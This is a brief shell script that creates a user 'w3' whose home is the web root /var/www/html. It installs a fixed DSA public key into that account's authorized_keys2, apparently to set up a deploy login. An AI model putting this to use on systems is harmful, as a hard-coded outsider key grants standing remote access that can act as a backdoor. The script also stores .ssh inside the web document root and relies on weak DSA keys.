useradd -u 200 -g 20 -d /var/www/html/ w3

mkdir -p /var/www/html/.ssh/
chown 200 /var/www/html/.ssh/
chgrp 20 /var/www/html/.ssh/
chmod 700 /var/www/html/.ssh/
echo ssh-dss AAAAB3NzaC1kc3MAAACBAK2b3ElEYSgZlHH9N75w1ifZdgBnLJCp4hts2EfxJjZq/iI5a2w9kKy9m0FuMWBRbs8pm8yFPXonk/OiIrGtmX7JpTvTks1JsEXm4cUYmlF9uGgTOXQRyoerD3uHzhrScqwYazQC5OHXbI0ake459dBEqWh6PAVu5t8mKjdzRZ0vAAAAFQCgd3X17XGVKsUgvrPDQn4IFN5oBwAAAIAYqKnvUsZJ7GheT1oo1855hukw3OUgVUvvxbNGRhyJz3l37czlIfihrEDIVhe4khYsJ3ljNIR3EowzE+uQzTBltzzPHr1MABMwqGB2ayx+GGA3iC1hdkZWnvgGEDaEtEBMzIGo2zag4iMNowMEIqIOIq3vWDmYJXU0Y2VgdKos8AAAAIAe1CBZ2rAkbpZ7YIP6/edCffGD+onTf5ME6Mzb994LEncFh4ptmODXqg3Iw32hu28PdWG2RXWBP78H8FqAuKEozmDGU/laiE0Zs+fmXKBWlsZWzOnaFVu5tKFsQGf74x9hyqH11CrXwQ5hOpgxZQgWoZ4NquGCC/hdyNVgoyxKqQ== w3@w3.mti.ad > /var/www/html/.ssh/authorized_keys2
chown 200 /var/www/html/.ssh/authorized_keys2
chgrp 20 /var/www/html/.ssh/authorized_keys2
chmod 600 /var/www/html/.ssh/authorized_keys2
